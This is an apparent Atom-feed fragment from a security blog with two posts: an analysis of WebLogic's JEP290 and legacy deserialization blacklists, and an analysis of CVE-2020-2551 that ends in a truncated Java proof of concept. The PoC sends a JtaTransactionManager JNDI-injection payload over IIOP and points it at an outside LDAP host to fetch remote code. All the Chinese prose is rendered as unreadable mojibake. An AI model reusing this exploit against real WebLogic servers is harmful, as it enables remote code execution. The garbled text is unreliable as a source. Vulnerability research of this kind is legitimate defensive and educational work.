class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span></code></pre><p>Áõ¥Êé•Á¶ÅÁî®‰∫Ü<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ÔºåÊâÄ‰ª•ËøîÂõû‰∫Ü<code>Status.REJECTED</code></p><hr><p>‚ÄúJSONÂèçÂ∫èÂàóÂåñ‰πãÊÆá_ÁúãÈõ™ÂÆâÂÖ®ÂºÄÂèëËÄÖÂ≥∞‰ºö‚ÄùÁöÑÊó∂Â∫èÂõæ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15855538532354.jpg" alt></p><h3 id="2-Weblogic-without-JEP290"><a href="#2-Weblogic-without-JEP290" class="headerlink" title="2. Weblogic without JEP290"></a>2. Weblogic without JEP290</h3><p>ÈÄöËøá‰∏äÈù¢Âú® JDK ‰∏≠ÁöÑÊäµÁî®Ê†à‰ø°ÊÅØÔºåÂèØ‰ª•ÁúãÂà∞Âú® weblogic ‰∏≠ÊòØÈÄöËøá<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>ËøõÂÖ•ÁöÑ<code>java.io.ObjectInputStream</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854721866812.jpg" alt="-w951"></p><p>Êàë‰ª¨Ë∑üËøõServerChannelInputStreamÁúã‰∏Ä‰∏ã</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854737021432.jpg" alt="-w1344"></p><p>ÂÜçÁúã‰∏Ä‰∏ã<code>ServerChannelInputStream</code>ÁöÑÁªßÊâøÂÖ≥Á≥ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854751893169.jpg" alt="-w626"></p><p>Âç≥<code>ServerChannelInputStream</code>ÁªßÊâøËá™FilteringObjectInputStreamÔºåÂπ∂ÈÄöËøáÈáçÂÜôresolveClass„ÄÅresolveProxyClass‰ªéËÄåËøõË°åÂèçÂ∫èÂàóÂåñËøáÊª§Èò≤Âæ°</p><p>Êàë‰ª¨Ë∑üËøõcheckLegacyBlacklistIfNeededÁúã‰∏Ä‰∏ãÔºåÂà∞Ëøô<code>weblogic.utils.io.oif.WebLogicObjectInputFilter#checkLegacyBlacklistIfNeeded</code>‰ºöÊ†πÊçÆÊòØÂê¶ÊîØÊåÅJEP290Ëá™Â∏¶ËøáÊª§ÔºåÂú®‰∏çÂèØÁî®ÊÉÖÂÜµ‰∏ã‰ºö‰ΩøÁî®<code>isBlacklistedLegacy</code>ËøõË°åÈò≤Âæ°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854755062154.jpg" alt="-w781"></p><p>Ëá≥‰∫éÂì™ÈáåË∞ÉÁî®JEP290ËøáÊª§ÂÖàÊîæ‰∏ÄËæπÔºåÊàë‰ª¨ÂÖàÁúã‰∏ãisBlacklistedLegacy</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854757085240.jpg" alt="-w786"></p><p>Â¶ÇÊûúÁ±ªÂêçÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏∫<code>[</code>ÔºàÊï∞ÁªÑÔºâÔºåÊàñ‰∏∫primitiveTypes‰∏≠ÁöÑÊüêÈ°πÔºåÂ∞±‰∏ç‰ºöËøõË°åÊ£ÄÊµã</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854758262158.jpg" alt="-w1124"><br>‰πãÂêé‰ºöÊ£ÄÊü•Á±ªÂûãÁ±ªÂêç„ÄÅÂåÖÂêçÊòØÂê¶Âú®LEGACY_BLACKLIST‰∏≠ÔºåÊúâ‰∏ÄÈ°π‰∏çÁ¨¶Âç≥ÂõûÂà∞‰∏äÈù¢ÊäõÂá∫ÂºÇÂ∏∏</p><p>Êàë‰ª¨ÁúãÁúãLEGACY_BLACKLISTÊòØÊÄé‰πàÊù•ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854765156752.jpg" alt="-w917"></p><p>Ë∑üËøõ<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>ÂèØ‰ª•ÂèëÁé∞ BLACKLIST ÂèñÂÜ≥‰∫éconstructLegacyBlacklistÊñπÊ≥ïÔºåËÄÉËôë‰∏ä‰∏ãÊñáËøΩÊ∫ØËá≥<code>processLegacyBlacklistProperties</code>ÔºåÂõ†‰∏∫Êàë‰ª¨ËÄÉËôëÁöÑÊòØ‰∏çÊîØÊåÅ JEP290 ÁöÑÊÉÖÂÜµÔºåÊâÄ‰ª•ËøõÂÖ•Âà∞ÊúÄÂêéÁöÑ else ÂàÜÊîØ‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854767314187.jpg" alt="-w1201"></p><p>ÊâÄ‰ª• BLACKLIST Êù•Ê∫ê‰∏ªË¶ÅÊù•Ëá™‰ª•‰∏ã‰∏âÂ§Ñ</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_PACKAGES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.apache.commons.collections.functors"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span><span class="token punctuation">,</span> <span class="token string">"javassist"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.activation"</span><span class="token punctuation">,</span> <span class="token string">"sun.rmi.server"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.builder"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.reader"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.proxy"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.metadata"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.model"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.annotation"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.autoproxy"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.beans.factory.support"</span><span class="token punctuation">,</span> <span class="token string">"org.python.core"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_CLASSES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.codehaus.groovy.runtime.ConvertedClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.ConversionHandler"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.MethodClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.UnicastRemoteObject"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObjectInvocationHandler"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObject"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"weblogic.rmi.blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-JEP290-in-Weblogic"><a href="#3-JEP290-in-Weblogic" class="headerlink" title="3. JEP290 in Weblogic"></a>3. JEP290 in Weblogic</h3><p>ÂõûÂà∞ JEP290 Ë∞ÉÁî®Ê†àÔºåÊàë‰ª¨Áü•ÈÅìÊúÄÂêéÊòØË∞ÉÁî®filterCheckËøõË°åÁöÑËøáÊª§</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854773851473.jpg" alt="-w1332"></p><p>Ë∑üÂÖ•ÔºåÊ≠§Êó∂serialFilter‰∏∫sun.misc.ObjectInputFilterÂØπË±°ÔºàÊ≥®ÊÑè JDK ‰∏∫8u151Ôºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854775780406.jpg" alt="-w1642"></p><pre class=" language-plain"><code class="language-plain">maxdepth=100;!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.UnicastRemoteObject;!java.rmi.server.RemoteObjectInvocationHandler;!com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.RemoteObject;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.*;!java.rmi.activation.*;!sun.rmi.server.*;!org.jboss.interceptor.builder.*;!org.jboss.interceptor.reader.*;!org.jboss.interceptor.proxy.*;!org.jboss.interceptor.spi.metadata.*;!org.jboss.interceptor.spi.model.*;!com.bea.core.repackaged.springframework.aop.aspectj.*;!com.bea.core.repackaged.springframework.aop.aspectj.annotation.*;!com.bea.core.repackaged.springframework.aop.aspectj.autoproxy.*;!com.bea.core.repackaged.springframework.beans.factory.support.*;!org.python.core.*</code></pre><p>Áúã‰∏äÈù¢ËøáÊª§ÁöÑÁ±ªÊòØ‰∏çÊòØÂæàÁÜüÊÇâÔºåÂÆûÈôÖ‰πüÊòØ<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>ÁîüÊàêÁöÑ filter</p><p>Ë∑üÂÖ•<code>sun.misc.ObjectInputFilter.Config.Global#checkInput</code>ÔºåÊï¥‰Ωì‰ª£Á†ÅÂíåregistryFilter‰∏≠ÁöÑÁ±ª‰ººÔºåÁ∫¢Ê°ÜÂ§ÑÊòØËøõË°åserialFilterÈªëÂêçÂçïÂåπÈÖç</p><blockquote><p>ËøôÈáåÁî®Âà∞‰∫Ü Function&lt;T, U&gt; Êé•Âè£Âíå lambda ËØ≠Ê≥ï</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854876431547.jpg" alt="-w1608"></p><p>‰∏ãÈù¢ÊòØ filter ÈÄöËøáÁîüËß£ÊûêÁîüÊàêËøáÁ®ãÔºåÈúÄË¶ÅÂú® weblogic ÂêØÂä®Êó∂‰∏ãÊñ≠ÁÇπËßÇÂØüÔºå‰º†ÂÖ•ÁöÑÂÄºÂíåserialFilterÊòØ‰∏ÄËá¥ÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15855527639904.jpg" alt="-w1400"></p><p>Â¶ÇÊûúËøîÂõû null ÊàñËÄÖ REJECTED ÈÉΩ‰ºöÊäõÂá∫ÂºÇÂ∏∏ÁªìÊùüÂèçÂ∫èÂàóÂåñÊµÅÁ®ã</p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://www.anquanke.com/post/id/201432" target="_blank" rel="noopener">Weblogic t3 ÂçèËÆÆÂà©Áî®‰∏éÈò≤Âæ°</a></li><li><a href="https://paper.seebug.org/728/" target="_blank" rel="noopener">‰ªéWebLogicÁúãÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÂà©Áî®‰∏éÈò≤Âæ°</a></li><li><a href="https://paper.seebug.org/454/" target="_blank" rel="noopener">ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑÊú´Êó•ÔºüJEP290Êú∫Âà∂Á†îÁ©∂</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker with Weblogic 12.2.1.4.0&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2551 ÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/e32c5d3e/"/>
    <id>https://blog.sari3l.com/posts/e32c5d3e/</id>
    <published>2020-03-20T04:43:47.000Z</published>
    <updated>2020-07-06T09:45:26.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Êê≠Âª∫"><a href="#Êê≠Âª∫" class="headerlink" title="Êê≠Âª∫"></a>Êê≠Âª∫</h2><ul><li>jdk 8u151</li><li>weblogic 12.1.4.0</li></ul><ol><li>ÈÄöËøá<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">Ê≠§È°πÁõÆ</a>Áõ¥Êé•ÁîüÊàê docker Âπ∂ÂêØÂä®ÔºåÂêåÊó∂Ê†πÊçÆÈ°πÁõÆËØ¥ÊòéÊ∑ªÂä† Remote Êñπ‰æøËøõË°å debug</li><li>ËøõÂÖ• docker Êã∑Ë¥ùÂá∫‰ª•‰∏ãÊñá‰ª∂Âπ∂Ê∑ªÂä†Ëá≥ poc È°πÁõÆ Libraries<ul><li>modules/com.bea.core.repackaged.springframework.spring.jar</li><li>server/lib/wlfullclient.jar</li></ul></li></ol><p>Ê≥®ÊÑèÔºöwlfullclient.jarÂú®12.1.3ÁâàÊú¨ÂêéË¢´ÁßªÈô§Ôºå<a href="https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/saclt/jarbuilder.html#GUID-FEFB26AB-0D48-4D86-BDE2-FDC04F7CE993" target="_blank" rel="noopener">ÁÇπÊ≠§Êü•ÁúãÂÖ∑‰Ωì‰ø°ÊÅØ</a>Ôºå‰ΩÜÂèØ‰ª•ÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§ÁîüÊàê</p><pre class=" language-shell"><code class="language-shell">cd WL_HOME/server/libjava -jar wljarbuilder.jar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15844996931979.jpg" alt="-w1072"></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846793440437.jpg" alt></p><p>IIOP ÂçèËÆÆÁúãÁöÑÂ§¥ÁñºÔºåÂè™Â•ΩÊåâÊµÅÁ®ãËØ¥‰∏Ä‰∏ã</p><p>ÊØè‰∏™ IIOP Êï∞ÊçÆÂåÖÈÉΩ‰ºöËøõÂÖ•<code>weblogic.iiop.ConnectionManager#dispatch</code>ËøõË°åËß£ÊûêÔºåÈïøÂ∫¶<code>end</code>ÂØπÂ∫îÊï∞ÊçÆÂØπÂ∫îÂéüÂßãÂåÖ‰∏≠Êï∞ÊçÆ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846250356635.jpg" alt="-w1917"></p><p>Áõ¥Âà∞Êî∂Âà∞ bind_any ÁöÑÊï∞ÊçÆÂåÖÔºàËøôÈáå wireshark Ê†áËÆ∞Êï∞ÊçÆÊúâ‰∫õÈóÆÈ¢òÔºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846279285782.jpg" alt="-w959"></p><p>‰πãÂêé<code>weblogic.rmi.internal.wls.WLSExecuteRequest#run</code>ËøõÂÖ•<code>weblogic.rmi.internal.BasicServerRef#handleRequest</code>Ëß£ÊûêËØ∑Ê±ÇÊï∞ÊçÆÔºåÂ¶ÇÊûúuserIdentity„ÄÅactionÂùá‰∏ç‰∏∫nullÔºàÂùá‰∏çÁî®Âú®ÊÑèÔºâÔºå‰ºö‰æùÊ¨°ËøõÂÖ•</p><ul><li><code>weblogic.rmi.cluster.ClusterableServerRef#invoke</code></li><li><code>weblogic.corba.idl.CorbaServerRef#invoke</code><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846285113448.jpg" alt="-w891"></li></ul><p>Â¶ÇÊûúmethod‰∏ç‰∏∫objectMedthods‰πã‰∏ÄÔºàÂÆö‰πâÂú®CorbaServerRefÊúÄÂ∫ïÈÉ®ÔºâÔºåÂàô‰ºöËøõÂÖ•<code>this.delegate._invoke</code>Âç≥<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846290493783.jpg" alt="-w1224"></p><p>ÈÄöËøáÂà§Êñ≠ method ËøõÂÖ•ÂØπÂ∫îÊµÅÁ®ã caseÔºåËøôÈáåËøõÂÖ• case 0</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846296787933.jpg" alt="-w1209"></p><p>ËøôÈáåÈÄöËøá<code>WNameHelper.read(InputStream istream)</code>ËØªÂèñÈÖçÁΩÆÂπ∂ËøõË°åÊ≥®ÂÜåÔºåÂú®ËØªÂèñlongÂûãÊï∞ÊçÆÊó∂‰ºöËøõË°å4 bytes ÂØπÈΩê</p><p>Á∫¢Ëâ≤ÈÉ®ÂàÜ‰∏∫Ê≥®ÂÜå‰∏™Êï∞ÔºåÈªëËâ≤ÈÉ®ÂàÜ‰∏∫ÂØπÈΩêÂøΩÁï•ÈÉ®ÂàÜÔºåÊ©òËâ≤‰∏∫ keyÔºåÁªøËâ≤‰∏∫ valueÔºåÂàÜÂà´ÂØπÂ∫î<code>id</code>Âíå<code>kind</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846330998516.jpg" alt="-w549"></p><p>ÁÑ∂ÂêéÂÖ≥Ê≥®<code>$result</code>ÊòØÂ¶Ç‰Ωï‰∫ßÁîüÁöÑÔºåÂÖàÂêéË∑üÂÖ•</p><ul><li><code>weblogic.iiop.IIOPInputStream#read_any</code></li><li><code>weblogic.corba.idl.AnyImpl#read_value</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341639516.jpg" alt="-w478"></p><p>È¶ñÂÖàÈÄöËøáËØªÂèñÁ±ªÂûã‰∏∫<code>1d</code>ÂêéÔºåÂ∞ÜËæìÂÖ•ÊµÅËøõË°åËß£Êûê</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341990330.jpg" alt="-w838"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846339190984.jpg" alt="-w552"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341251085.jpg" alt="-w586"></p><p>‰πãÂêéËøõÂÖ•ÈÄöËøáËÆæÁΩÆ type ËøõÂÖ•<code>weblogic.corba.idl.AnyImpl#read_value</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846343594879.jpg" alt="-w703"></p><p>‰πãÂêéË∑üÂÖ•<code>weblogic.corba.idl.AnyImpl#read_value_internal</code>ÔºåËøôÈáå‰ºöÊ†πÊçÆ type Á±ªÂûã(29)Â∞ùËØïËé∑ÂèñÊï∞ÊçÆ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846347052690.jpg" alt="-w676"></p><p>ËøôÈáå‰ºöËøõÂÖ•<code>weblogic.iiop.IIOPInputStream#read_value()</code>ÔºåÁúãÂà∞Â∫èÂàóÂåñÁöÑÊ†áÂøó</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846347768580.jpg" alt="-w415"></p><p>È¶ñÂÖà‰ºöËØªÂèñ valueTagÔºåÔºàËøôÈáåÂá∫Áé∞ÁöÑ<code>getIndirectionValue</code>‰∏çÁü•ÈÅìËÉΩ‰∏çËÉΩÂà©Áî®Ôºå‰∏ãÊù•ÁúãÁúãÔºâÔºåÈÄöËøáÊü•ÊâæÊòØÂê¶Â∑≤ÁªèÊúâËøáÂØπÂ∫î codebase ÈÅøÂÖçÈáçÂ§çËé∑ÂèñÔºåÂ¶ÇËã•Ê≤°ÊúâÂàô‰ºöÈÄöËøá‰πãÂêéÁöÑÊï∞ÊçÆËé∑ÂèñRMIÊ≥®ÂÜåË°®‰ø°ÊÅØ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846754165917.jpg" alt="-w862"></p><p>ÂØπÂ∫î‰ΩçÁΩÆÂ¶Ç‰∏ãÔºåÈªÑÁªøËâ≤‰∏∫ valueTagÔºåËìùËâ≤RMIÊ≥®ÂÜåÊï∞ÊçÆÈïøÂ∫¶ÔºåÁªøËâ≤‰∏∫RMIÊ≥®ÂÜåÂÜÖÂÆπÔºà‰πãÂêéÂ±ûÊÄßÂÄºËß£Êûê‰πüÁ±ª‰ººÔºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846760327927.jpg" alt="-w600"></p><p>Áî±‰∫éÊª°Ë∂≥<code>ObjectStreamClass.supportsUnsafeSerialization() == true</code>ÔºåËøõÂÖ•‰∏ãÈù¢ÁöÑÂ§ÑÁêÜÈÄªËæëÔºö</p><p>È¶ñÂÖàÈÄöËøáÂèçÂ∞ÑËé∑ÂèñÂÆû‰æãÂØπË±°</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846763190170.jpg" alt="-w1646"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846764221761.jpg" alt="-w857"></p><p>‰πãÂêéËøõÂÖ•<code>weblogic.iiop.ValueHandlerImpl#readValue</code>ÔºåÈÄöËøáÊ∑±Â∫¶ÈÅçÂéÜÂ∞ÜÂÖ∂Â≠óÊÆµÂÖ®ÈÉ®ËØªÂèñÂá∫Êù•ÊîæÂÖ•<code>indirectionMap</code>ÂÜÖÂÆûÁé∞ÂÆåÊï¥Â∫èÂàóÂåñ</p><p>Âú®ËØªÂèñÂ±ûÊÄßÂÄºÊó∂ÔºåË∑üÂÖ•Âà∞<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846780406325.jpg" alt="-w767"></p><p>Âú®ËøôÈáåÂÖàÈÄöËøá<code>java.io.ObjectInputStream#defaultReadObject</code>‰ºöËØªÂèñÂ±ûÊÄßÂÄºÂà∞<code>JtaTransactionManager</code>‰∏≠ÔºåÂêåÊó∂ÁîüÊàê‰∏Ä‰∏™ JndiTemplate ÂÆû‰æã</p><p>Ë∑üÂÖ•<code>initUserTransactionAndTransactionManager</code>ÔºåÂΩìuserTransaction‰∏∫Á©∫Êó∂Ôºå‰ºöÈÄöËøá‰ªéÊèê‰æõÁöÑuserTransactionName‰∏≠ËøõË°åËØªÂèñ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846784321693.jpg" alt="-w793"></p><p>‰∏ÄË∑ØË∑üÂà∞<code>com.bea.core.repackaged.springframework.jndi.JndiTemplate#execute</code>ÔºåÂâ©‰∏ãÂ∞±ÊòØ JNDIÁöÑÂÜÖÂÆπ‰∫Ü</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846788075894.jpg" alt="-w844"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li>JtaTransactionManagerÊòØspringÁàÜÂá∫ÁöÑ‰∏Ä‰∏™ÂèØ‰ª•JNDIÊ≥®ÂÖ•ÁöÑÁ±ªÔºåÂú®weblogic‰∏≠‰πüÂ≠òÂú®</li><li>weblogic.jndi.WLInitialContextFactory ÊòØweblogicÁöÑJNDIÂ∑•ÂéÇÁ±ª</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>bea<span class="token punctuation">.</span>core<span class="token punctuation">.</span>repackaged<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>jta<span class="token punctuation">.</span>JtaTransactionManager<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Gadgets<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2551</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// target host</span>        String port <span class="token operator">=</span> <span class="token string">"7001"</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// target port</span>        String url <span class="token operator">=</span> <span class="token string">"ldap://192.168.31.96:1099/exp2"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// rmi/ldap url</span>        Hashtable<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.factory.initial"</span><span class="token punctuation">,</span> <span class="token string">"weblogic.jndi.WLInitialContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token 